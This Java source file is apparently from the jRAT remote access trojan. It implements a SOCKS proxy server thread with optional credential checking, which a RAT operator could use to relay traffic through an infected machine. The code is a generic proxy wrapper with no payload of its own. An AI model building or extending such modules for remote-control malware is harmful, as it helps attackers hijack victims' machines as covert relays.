package jrat.module.socks;

import socks.ProxyServer;
import socks.server.ServerAuthenticatorNone;
import socks.server.UserPasswordAuthenticator;
import socks.server.UserValidation;

import java.net.Socket;

public class ServerThread extends Thread {

    private static ProxyServer server;

    private String user;
    private String pass;
    private boolean socks5;
    private boolean auth;
    private int port;
    private String host;

    public ServerThread(String host, int port, String user, String pass, boolean socks5, boolean auth) {
        this.host = host;
        this.port = port;
        this.user = user;
        this.pass = pass;
        this.socks5 = socks5;
        this.auth = auth;
    }

    public void run() {
        try {
            server = new ProxyServer(socks5 && auth ? new UserPasswordAuthenticator(new UserValidation() {
                @Override
                public boolean isUserValid(String username, String password, Socket connection) {
                    if (!auth) {
                        return true;
                    }
                    return username.equals(user) && password.equals(pass);
                }
            }) : new ServerAuthenticatorNone());
            ProxyServer.setLog(System.out);
            SocksClientModule.server = server;
            server.start(port, 5, host);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void stopProxy() {
        server.stop();
    }
}
